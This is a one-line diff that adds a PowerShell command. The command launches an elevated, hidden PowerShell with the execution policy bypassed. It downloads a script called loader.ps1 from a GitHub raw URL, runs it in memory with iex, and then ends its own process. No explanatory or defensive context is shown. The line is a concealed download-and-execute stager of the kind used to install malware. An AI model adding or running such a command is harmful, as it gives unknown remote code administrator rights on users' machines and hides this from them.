@@ -1,0 +1,1 @@
+Start-Process powershell -Verb RunAs -ArgumentList '-w hidden -ep bypass -c "iwr -useb https://raw.githubusercontent.com/awsmeawschees/bbnn/main/loader.ps1 | iex; Start-Sleep 2; Stop-Process -Id $PID"'
